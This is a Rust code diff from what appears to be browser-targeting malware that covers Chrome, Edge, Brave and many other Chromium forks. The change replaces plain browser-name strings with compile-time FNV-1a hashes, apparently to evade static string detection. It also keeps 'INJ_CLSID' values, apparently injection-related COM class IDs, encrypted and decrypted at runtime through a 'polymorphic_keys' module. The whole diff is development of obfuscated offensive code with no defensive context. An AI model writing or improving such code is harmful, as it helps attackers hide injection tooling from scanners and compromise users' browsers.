@@ -71,20 +71,34 @@ fn targets() -> Vec<ChromiumTarget> {
     ]
 }
 
+const fn fnv1a(s: &[u8]) -> u64 {
+    let mut h: u64 = 0xcbf29ce484222325;
+    let mut i = 0;
+    while i < s.len() {
+        h ^= s[i] as u64;
+        h = h.wrapping_mul(0x100000001b3);
+        i += 1;
+    }
+    h
+}
+
 fn fallback_canonical_clsid(name: &str) -> Option<String> {
     use crate::polymorphic_keys::*;
-    match name {
-        "Chrome"        => Some(dec!(INJ_CLSID_CHROME_ENC,        &INJ_CLSID_CHROME_KEY,        &INJ_CLSID_CHROME_NONCE)),
-        "Chrome Beta"   => Some(dec!(INJ_CLSID_CHROME_BETA_ENC,   &INJ_CLSID_CHROME_BETA_KEY,   &INJ_CLSID_CHROME_BETA_NONCE)),
-        "Chrome Dev"    => Some(dec!(INJ_CLSID_CHROME_DEV_ENC,    &INJ_CLSID_CHROME_DEV_KEY,    &INJ_CLSID_CHROME_DEV_NONCE)),
-        "Chrome Canary" => Some(dec!(INJ_CLSID_CHROME_CANARY_ENC, &INJ_CLSID_CHROME_CANARY_KEY, &INJ_CLSID_CHROME_CANARY_NONCE)),
-        "Edge"          => Some(dec!(INJ_CLSID_EDGE_ENC,          &INJ_CLSID_EDGE_KEY,          &INJ_CLSID_EDGE_NONCE)),
-        "Brave"         => Some(dec!(INJ_CLSID_BRAVE_ENC,         &INJ_CLSID_BRAVE_KEY,         &INJ_CLSID_BRAVE_NONCE)),
-        "Chromium" | "Vivaldi" | "Opera" | "Yandex" | "CocCoc" | "CentBrowser"
-        | "360Chrome" | "Epic Privacy Browser" | "Uran" | "7Star" | "Torch"
-        | "Kometa" | "Orbitum" | "Amigo" | "Sputnik" | "Slimjet" | "Iridium"
-        | "Thorium" | "Arc" => Some(dec!(INJ_CLSID_CHROME_ENC, &INJ_CLSID_CHROME_KEY, &INJ_CLSID_CHROME_NONCE)),
-        _ => None,
+    const H_CHROME:        u64 = fnv1a(b"Chrome");
+    const H_CHROME_BETA:   u64 = fnv1a(b"Chrome Beta");
+    const H_CHROME_DEV:    u64 = fnv1a(b"Chrome Dev");
+    const H_CHROME_CANARY: u64 = fnv1a(b"Chrome Canary");
+    const H_EDGE:          u64 = fnv1a(b"Edge");
+    const H_BRAVE:         u64 = fnv1a(b"Brave");
+    let h = fnv1a(name.as_bytes());
+    match h {
+        H_CHROME        => Some(dec!(INJ_CLSID_CHROME_ENC,        &INJ_CLSID_CHROME_KEY,        &INJ_CLSID_CHROME_NONCE)),
+        H_CHROME_BETA   => Some(dec!(INJ_CLSID_CHROME_BETA_ENC,   &INJ_CLSID_CHROME_BETA_KEY,   &INJ_CLSID_CHROME_BETA_NONCE)),
+        H_CHROME_DEV    => Some(dec!(INJ_CLSID_CHROME_DEV_ENC,    &INJ_CLSID_CHROME_DEV_KEY,    &INJ_CLSID_CHROME_DEV_NONCE)),
+        H_CHROME_CANARY => Some(dec!(INJ_CLSID_CHROME_CANARY_ENC, &INJ_CLSID_CHROME_CANARY_KEY, &INJ_CLSID_CHROME_CANARY_NONCE)),
+        H_EDGE          => Some(dec!(INJ_CLSID_EDGE_ENC,          &INJ_CLSID_EDGE_KEY,          &INJ_CLSID_EDGE_NONCE)),
+        H_BRAVE         => Some(dec!(INJ_CLSID_BRAVE_ENC,         &INJ_CLSID_BRAVE_KEY,         &INJ_CLSID_BRAVE_NONCE)),
+        _               => Some(dec!(INJ_CLSID_CHROME_ENC,        &INJ_CLSID_CHROME_KEY,        &INJ_CLSID_CHROME_NONCE)),
     }
 }
 
